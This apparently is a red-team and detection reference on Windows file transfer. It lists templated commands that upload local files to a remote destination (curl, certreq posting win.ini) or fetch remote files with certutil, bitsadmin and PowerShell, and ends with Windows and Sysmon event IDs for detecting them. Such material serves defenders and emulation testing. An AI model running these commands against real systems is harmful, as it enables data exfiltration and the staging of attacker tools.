
### Curl
```cmd
#{curl_path} -T #{file_path} #{remote_destination}
#{curl_path} --upload-file #{file_path} #{remote_destination}
#{curl_path} -d #{file_path} #{remote_destination}
#{curl_path} --data #{file_path} #{remote_destination}
```

### certq

```cmd
certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}
```

### certuitl

```cmd
cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
```

### bitsadmin

```cmd
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
```

### powershell webclient
```powershell
(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
```

### powershell invoke web request:

```powershell
powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
```

Windows Event Viewer:

- Event ID 5156 (Windows Server 2008 and later): The Windows Filtering Platform has permitted a connection, which could indicate an adversary transferring tools using an external connection.
    
- Event ID 4663 (Windows Server 2008 and later): An attempt was made to access an object, which could indicate an adversary attempting to access files transferred from an external system.
    

Sysmon:

- Event ID 3 - Network connections: Monitor for network connections made to external systems or services, especially those originating from unexpected or unauthorized sources, which could indicate an adversary attempting to transfer tools or files into the compromised environment.
    
- Event ID 10 - Process accessed: Monitor for processes accessing file transfer-related processes or services, such as FTP clients, native system utilities (e.g., certutil.exe, powershell.exe), or command and control channels, especially those with unusual command-line arguments or suspicious behaviors.

